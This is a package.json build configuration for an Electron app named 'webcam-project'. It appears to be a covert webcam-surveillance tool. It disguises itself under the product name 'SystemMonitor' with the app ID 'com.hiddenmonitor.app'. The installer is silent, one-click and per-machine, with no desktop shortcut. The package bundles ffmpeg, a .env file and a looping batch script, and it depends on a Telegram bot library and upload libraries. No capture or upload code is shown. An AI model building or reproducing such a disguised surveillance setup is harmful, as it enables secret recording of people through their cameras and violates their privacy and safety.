{
  "name": "webcam-project",
  "version": "1.0.4",
  "main": "src/main.js",
  "scripts": {
    "start": "node launcher.js",
    "dev": "electron .",
    "build": "electron-builder"
  },
  "devDependencies": {
    "electron": "40.2.1",
    "electron-builder": "^22.14.13"
  },
  "build": {
    "appId": "com.hiddenmonitor.app",
    "productName": "SystemMonitor",
    "executableName": "SystemMonitor",
    "asar": true,
    "asarUnpack": [
      "node_modules/ffmpeg-static/**"
    ],
    "extraResources": [
      {
        "from": "node_modules/ffmpeg-static",
        "to": "ffmpeg-static"
      },
      {
        "from": ".env",
        "to": ".env"
      },
      {
        "from": "run_loop.bat",
        "to": "run_loop.bat"
      }
    ],
    "win": {
      "target": "nsis"
    },
    "nsis": {
      "oneClick": true,
      "allowToChangeInstallationDirectory": false,
      "perMachine": true,
      "createDesktopShortcut": false,
      "runAfterFinish": false,
      "include": "installer.nsi"
    },
    "directories": {
      "output": "dist"
    }
  },
  "dependencies": {
    "axios": "^1.13.5",
    "dotenv": "^17.3.1",
    "electron-is-dev": "^3.0.1",
    "electron-store": "8.2.0",
    "ffmpeg-static": "^5.3.0",
    "form-data": "^4.0.5",
    "telegraf": "^4.16.3"
  }
}
